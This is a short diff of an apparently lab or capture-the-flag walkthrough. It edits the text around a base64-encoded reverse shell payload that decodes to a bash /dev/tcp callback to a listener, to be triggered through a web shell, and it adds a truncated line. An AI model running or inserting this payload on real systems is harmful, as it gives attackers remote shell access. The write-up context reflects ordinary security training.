@@ -1064,7 +1064,9 @@ The listener is up and waiting. Leave this terminal open and move to Terminal 2.
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=
 ```
 
-This is the base64-encoded reverse shell payload. Now trigger it through the web shell — make sure your listener in Terminal 1 is still running before sending this:
+This is the base64-encoded reverse shell payload.
+
+Why 
 <div align="center">
 <br>
 <br>
